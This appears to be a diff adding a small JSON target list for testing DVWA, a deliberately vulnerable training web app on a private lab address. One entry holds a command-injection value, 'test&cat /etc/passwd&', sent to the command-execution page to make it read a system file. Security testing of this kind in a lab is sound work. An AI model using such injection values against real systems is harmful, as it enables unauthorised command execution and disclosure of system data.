@@ -1,0 +1,14 @@
+[
+  {
+    "url": "http://192.168.153.200/DVWA/vulnerabilities/exec/",
+    "method": "POST",
+    "param": "ip",
+    "values": ["test&cat /etc/passwd&"]
+  },
+  {
+    "url": "http://192.168.153.200/DVWA/vulnerabilities/weak_id/",
+    "method": "POST",
+    "param": "step",
+    "values": ["1"]
+  }
+]
